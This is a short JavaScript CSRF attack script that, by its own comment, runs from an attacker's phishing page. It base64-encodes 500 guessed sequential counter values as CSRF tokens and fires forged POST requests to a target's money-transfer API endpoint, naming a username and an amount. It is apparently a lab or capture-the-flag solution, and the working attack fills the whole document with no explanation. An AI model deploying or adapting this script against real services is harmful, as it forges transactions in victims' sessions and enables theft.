// Token spraying script hosted on the attacker's phishing page 
const START = 8974; // Estimated global counter baseline 
const COUNT = 500;  // Spray window size 
 
for (let i = 0; i < COUNT; i++) { 
    const tokenInt = START + i; 
    const token = btoa(tokenInt.toString());  
 
    const params = new URLSearchParams(); 
    params.append('csrf_token', token); 
    params.append('username', "z5602760"); 
    params.append('amount', 1); 
 
    fetch("https://phish-me.quoccacorp.com/api/transfer", { 
        method: "POST", 
        mode: "no-cors", 
        body: params, 
        headers: { "Content-Type": "application/x-www-form-urlencoded" } 
    }); 
}
